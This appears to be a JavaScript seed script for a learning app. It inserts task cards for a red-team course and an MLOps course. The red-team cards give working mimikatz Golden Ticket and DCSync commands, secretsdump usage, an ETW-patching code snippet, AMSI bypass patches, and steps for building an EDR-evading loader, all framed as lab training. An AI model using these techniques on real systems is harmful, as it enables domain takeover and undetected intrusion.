	['Forge Golden Ticket', `Golden Ticket = forged TGT, valid for 10 years. Need: krbtgt hash (from DCSync) + domain SID. Create: mimikatz # kerberos::golden /user:Administrator /domain:lab.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt. Result: you ARE Domain Admin. Access any resource, any user. Detection: TGT without corresponding AS-REQ in logs. Test: access DC C$ share with forged ticket.`],
	['Execute DCSync attack', `DCSync: pretend to be a Domain Controller, ask for password replication. Need: Replicating Directory Changes (usually Domain Admins, or misconfigured ACL). Attack: mimikatz # lsadump::dcsync /domain:lab.local /user:Administrator - gets Administrator hash. Or: secretsdump.py domain/user:pass@dc -just-dc-ntlm. Get krbtgt hash for Golden Ticket, all user hashes for PtH. Ultimate persistence.`]
];

secCoreTasks.forEach(([title, desc], i) => {
	insertTask.run(secMod2.lastInsertRowid, title, desc, i, now);
});

// Month 3: Evasion & Integration
const secMod3 = insertModule.run(
	secPath.lastInsertRowid,
	'Month 3: Evasion & Integration',
	'EDR bypass and full chain operations',
	2,
	now
);

const secEvasionTasks = [
	['Study EDR detection layers', `Deep dive into each layer: 1) User-mode hooks - patches in ntdll.dll to intercept API calls, 2) Kernel callbacks - PsSetCreateProcessNotifyRoutine, etc. notify EDR of process/thread/image events, 3) ETW (Event Tracing for Windows) - .NET CLR, PowerShell, Syscall providers send telemetry, 4) AMSI (Antimalware Scan Interface) - scans scripts before execution, 5) Memory scanning - periodic scans for known shellcode patterns. Know your enemy.`],
	['Implement indirect syscalls', `Direct syscalls: "syscall" instruction in your binary = detection. Indirect: find "syscall; ret" gadget in ntdll.dll, jump to it instead. Steps: 1) Find syscall number (SSN) for NtAllocateVirtualMemory, 2) Set up registers (rcx, rdx, r8, r9, stack), 3) Jump to syscall gadget in ntdll. Tools: HellsGate (resolve SSN at runtime). More evasive than direct syscalls.`],
	['Implement module stomping', `Problem: allocated RWX memory is suspicious. Solution: overwrite a legitimate DLL in memory. Steps: 1) LoadLibrary a signed DLL you don't need (e.g., amsi.dll, clrjit.dll), 2) Change protection to RW, 3) Write your shellcode over .text section, 4) Change back to RX, 5) Execute. Your code now lives in "legitimate" DLL memory region. Harder for EDR to flag.`],
	['Add sleep obfuscation', `Problem: beacon in memory during 60s sleep = scannable. Solution: encrypt entire beacon memory before sleep, decrypt after. Implementation: 1) Register VEH handler, 2) Encrypt beacon with key, 3) Sleep, 4) VEH triggers on first instruction (guard page or timer), 5) Decrypt beacon, continue. Techniques: Ekko, Foliage, Gargoyle. Advanced: use hardware breakpoints, CONTEXT manipulation.`],
	['Patch ETW in loader', `ETW sends telemetry to EDR. Bypass: patch EtwEventWrite in ntdll.dll to return immediately. Code: void* addr = GetProcAddress(GetModuleHandle("ntdll"), "EtwEventWrite"); DWORD old; VirtualProtect(addr, 1, PAGE_READWRITE, &old); *(char*)addr = 0xC3; // ret. Do this early in loader. Also consider: NtTraceEvent, EtwEventWriteFull. Blinds many ETW-based detections.`],
	['Implement AMSI bypass', `AMSI scans PowerShell, VBScript, JScript, .NET before execution. Classic bypass: patch AmsiScanBuffer in amsi.dll to return AMSI_RESULT_CLEAN. Code: patch first bytes to "mov eax, 0x80070057; ret" (returns error, scan skipped). Or: use reflection to set amsiInitFailed = true in AmsiUtils class. Test: run Invoke-Mimikatz after bypass - should not be flagged.`],
	['Study threadless injection', `CreateRemoteThread = detected. Alternatives: 1) Thread hijacking - suspend existing thread, modify RIP, resume, 2) APC injection - queue APC to alertable thread, 3) Callback injection - SetWindowsHookEx, KernelCallbackTable, 4) Thread pool abuse - modify thread pool work item. Each avoids suspicious "new thread in remote process" telemetry. Study: @_EthicalChaos_, @modexpblog research.`],
	['Build loader that bypasses Defender', `Combine everything: encrypted payload (AES), runtime decryption with derived key, direct/indirect syscalls for memory allocation, module stomping or legitimate memory region, unhook ntdll, patch ETW and AMSI, delayed execution with environment checks. Test against Defender with all protections enabled. If detected: identify which component triggered, iterate.`],
	['Deploy Elastic Security in lab', `Elastic Security = free EDR with decent detection. Setup: 1) Install Elasticsearch + Kibana, 2) Install Elastic Agent with Endpoint Security integration on workstations, 3) Enable all protections (malware, memory, behavior). Now your lab has real EDR. Run your tools against it. Check alerts in Kibana. This is closer to real enterprise than just Defender.`],
	['Enable Sysmon with SwiftOnSecurity config', `Sysmon = System Monitor, logs detailed events. SwiftOnSecurity config = community tuned ruleset. Setup: sysmon64.exe -i sysmonconfig-export.xml. Now you have: process creation with command line, network connections, file creates, registry changes, all forwarded to Event Log. Analyze: what events does your malware generate? This is what blue team sees.`],
	['Full compromise with custom tools only', `End-to-end assessment of your lab using ONLY tools you built: 1) Initial access (phishing payload with your loader), 2) Establish C2 (your beacon), 3) Enumerate with your scripts, 4) Dump creds with your dumper, 5) Lateral move (PtH with your tooling), 6) Reach DC, DCSync, forge Golden Ticket. No Cobalt Strike, no Mimikatz, no Rubeus - only YOUR code.`],
	['Review logs and document detections', `After your attack: 1) Check Elastic Security alerts - what triggered?, 2) Review Sysmon logs - what events were generated?, 3) Check Windows Security log - authentication events?, 4) Document: "My loader triggered memory scan at X", "My C2 was flagged for beacon interval", etc. This is your improvement roadmap. Blue team perspective is invaluable.`],
	['Implement detection bypasses', `For each detection you found: research bypass. Memory scan catching shellcode? → add more encoding, stomping. Network detection? → change C2 profile, add jitter, domain front. Process creation logged? → use different parent, modify command line. Iterate: modify tool → test → check logs → repeat. Goal: clean attack chain with no alerts in Elastic Security.`]
];

secEvasionTasks.forEach(([title, desc], i) => {
	insertTask.run(secMod3.lastInsertRowid, title, desc, i, now);
});

// ============================================================================
// ML Pipeline Path (from ml-pipeline-complete-guide.md concepts)
// ============================================================================
const mlOpsPath = insertPath.run(
	'ML Engineering & Ops',
	'Build production ML pipelines, from data processing to model serving. Covers the full lifecycle of ML systems.',
	'blue',
	now
);

const mlOpsMod1 = insertModule.run(
	mlOpsPath.lastInsertRowid,
	'Data Engineering',
	'Data pipelines and feature engineering',
	0,
	now
);

const dataTasks = [
	['Set up feature store template', `Feature store = centralized repository for ML features. Build class with: write_features(entity_id, features_dict, timestamp), get_features(entity_id, feature_names, point_in_time), list_features(). Storage: SQLite for simple, Redis for real-time, Feast for production. Key concept: point-in-time correctness - don't leak future data. Template should handle feature versioning.`],
	['Implement ETL pipeline base class', `Abstract base class: class Pipeline: extract() → raw data, transform(raw) → processed data, load(processed) → destination. Implement for each data source. Add: logging, error handling, retry logic, idempotency (safe to re-run). Use: Airflow for scheduling, or simple cron. Test: pipeline should be restartable at any point without duplicating data.`],
	['Create data validation pipeline', `Validate before training: 1) Schema validation - column names, types, nullable, 2) Statistical checks - value ranges, distributions, null rates, 3) Data drift detection - compare to baseline statistics. Libraries: Great Expectations, Pandera, or custom. Fail pipeline if validation fails. Log statistics for monitoring. Catch bad data before it poisons your model.`],
	['Build streaming data processor', `Real-time feature updates. Options: Kafka + Flink (heavy), Redis Streams (medium), Python asyncio (light). Pattern: consume event → compute features → update feature store → trigger model if needed. Handle: late arrivals, out-of-order events, exactly-once processing. Start simple: Redis pub/sub with async Python consumer.`],
	['Implement data versioning', `DVC (Data Version Control): dvc init, dvc add data.csv, git commit, dvc push to S3/GCS. Now data is versioned like code. Alternative: Delta Lake for parquet (time travel queries), or just timestamp your datasets. Key: reproduce any experiment by checking out code + data version. Test: can you restore dataset from 3 months ago?`]
];

dataTasks.forEach(([title, desc], i) => {
	insertTask.run(mlOpsMod1.lastInsertRowid, title, desc, i, now);
});

const mlOpsMod2 = insertModule.run(
	mlOpsPath.lastInsertRowid,
	'Model Training',
	'Training pipelines and experiment tracking',
	1,
	now
);

const trainingOpsTasks = [
	['Set up MLflow tracking', `pip install mlflow, mlflow server --backend-store-uri sqlite:///mlflow.db. In code: mlflow.set_experiment("my-experiment"); with mlflow.start_run(): mlflow.log_params({"lr": 0.01}); mlflow.log_metrics({"loss": 0.5}); mlflow.sklearn.log_model(model, "model"). Model registry: promote models through stages (staging → production). UI at localhost:5000 shows all experiments.`],
	['Implement hyperparameter tuning', `Optuna: import optuna; def objective(trial): lr = trial.suggest_float("lr", 1e-5, 1e-2, log=True); model = train(lr); return val_loss. study = optuna.create_study(); study.optimize(objective, n_trials=100). Features: pruning (stop bad trials early), visualization, parallel trials. Log best params to MLflow. Compare to grid search: Optuna is 3-10x more efficient.`],
	['Build cross-validation pipeline', `For tabular: sklearn KFold or StratifiedKFold. For time series: TimeSeriesSplit (don't shuffle!). Pipeline: split data → train on fold → evaluate → aggregate metrics. Log each fold to MLflow. Report mean ± std across folds. Important: tune hyperparams in inner loop, evaluate on outer loop (nested CV) to avoid overfitting to validation set.`],
	['Create model comparison framework', `Compare models fairly: same data splits, same metrics, same compute budget. Build table: Model | Train Time | Val Loss | Test Loss | Inference Time | Model Size. Statistical significance: paired t-test or bootstrap on fold results. Dashboard: Streamlit or Grafana showing current models and metrics. Automate: new model trains → auto-compare to baseline.`],
	['Implement distributed training', `PyTorch DDP: torchrun --nproc_per_node=2 train.py. In code: dist.init_process_group("nccl"); model = DDP(model); sampler = DistributedSampler(dataset). Gradient sync is automatic. Multi-node: set MASTER_ADDR, MASTER_PORT. Mixed precision: torch.cuda.amp.autocast(). Monitor: GPU utilization should be >80%. Common issues: unbalanced batches, gradient accumulation.`]
];

trainingOpsTasks.forEach(([title, desc], i) => {
	insertTask.run(mlOpsMod2.lastInsertRowid, title, desc, i, now);
});

const mlOpsMod3 = insertModule.run(
	mlOpsPath.lastInsertRowid,
	'Model Serving',
	'Deploy and serve models in production',
	2,
	now
);

const servingTasks = [
	['Build FastAPI inference server', `from fastapi import FastAPI; app = FastAPI(); @app.post("/predict") async def predict(data: PredictRequest): return model.predict(data.features). Add: request validation with Pydantic, async for I/O bound ops, background tasks for logging. Deployment: uvicorn + gunicorn, or Docker. Load model once at startup. Health check endpoint. OpenAPI docs auto-generated.`],
	['Implement model versioning', `Blue-green: run v1 and v2 simultaneously, route traffic gradually. Implementation: /predict?version=2 or header-based routing. Model storage: MLflow registry with stages, or S3 with version prefixes. Rollback: instant switch back to v1 if v2 fails. A/B testing: 10% to v2, compare metrics, ramp up if good. Track: which version served each request.`],
	['Add monitoring and alerting', `Evidently: from evidently.metrics import DataDriftPreset; report = Report([DataDriftPreset()]); report.run(reference=train_data, current=today_data). Monitor: 1) Input drift - features changing distribution, 2) Prediction drift - outputs changing, 3) Concept drift - relationship between X and Y changing. Alert: Slack/PagerDuty when drift detected. Dashboard: Grafana + Prometheus.`],
	['Create load testing suite', `Locust: from locust import HttpUser, task; class Predictor(HttpUser): @task def predict(self): self.client.post("/predict", json={...}). Run: locust -f loadtest.py. Measure: requests/sec, p50/p95/p99 latency, error rate. Test scenarios: normal load, burst, sustained high load. Find breaking point. Optimize: batching, caching, model quantization.`],
	['Implement graceful degradation', `When model fails: 1) Return cached prediction if available, 2) Fall back to simpler model (e.g., rules-based), 3) Return safe default with confidence=0, 4) Queue request for async processing. Circuit breaker pattern: if error rate > threshold, stop calling model, return fallback. Timeouts: don't let slow predictions block. Test: kill model process, verify graceful handling.`]
];

servingTasks.forEach(([title, desc], i) => {
	insertTask.run(mlOpsMod3.lastInsertRowid, title, desc, i, now);
});

console.log('Database seeded successfully!');
console.log('Created 3 learning paths:');
console.log('  - AI/ML Deep Learning (6 modules, includes Math Foundations)');
console.log('  - Red Team & Offensive Security (3 modules)');
console.log('  - ML Engineering & Ops (3 modules)');

db.close();
